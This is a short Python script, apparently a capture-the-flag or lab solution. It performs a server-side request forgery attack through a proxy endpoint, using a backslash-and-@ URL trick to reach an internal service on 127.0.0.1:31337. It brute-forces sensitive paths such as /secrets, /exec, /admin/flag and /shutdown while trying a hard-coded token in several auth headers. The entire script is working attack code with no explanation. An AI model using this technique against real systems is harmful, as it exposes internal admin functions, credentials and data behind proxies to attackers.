import requests, itertools
P="http://127.0.0.1:24606/api/proxy"
U="http://rates.partner-forex.example.com\\@127.0.0.1:31337"
TOK="9f2c7e14a6b3d508c1e04f7a2b8d6350a17e9c4b2d6f8035e1c9a7b4d2f60813"
base=["/config","/admin","/admin/config","/admin/flag","/debug","/env","/secrets","/token",
"/flag","/read","/exec","/files","/logs","/status","/health","/metrics","/shutdown","/reload",
"/restart","/export","/dump","/backup","/key","/keys","/seed","/session","/sessions","/relay",
"/core","/ledger","/summary","/ping","/version","/info","/whoami","/api","/v1","/internal",
"/console","/ops","/maintenance","/maintenance/config","/config.json","/config.yaml"]
paths=[]
for b in base:
    paths.append(b)
    for pre in ["/api","/v1","/internal","/admin"]:
        paths.append(pre+b)
seen=set(); paths=[p for p in paths if not (p in seen or seen.add(p))]
hdrs=[{},{"Authorization":"Bearer "+TOK},{"X-Admin-Token":TOK},{"X-Token":TOK}]
for p in paths:
    for h in hdrs:
        try:
            r=requests.get(P, params={"url":U+p}, headers=h, timeout=5)
            if r.status_code!=404 and r.status_code!=502:
                print("HIT",p,list(h),r.status_code,r.text[:150].replace("\n"," "),flush=True)
        except Exception: pass
print("done")
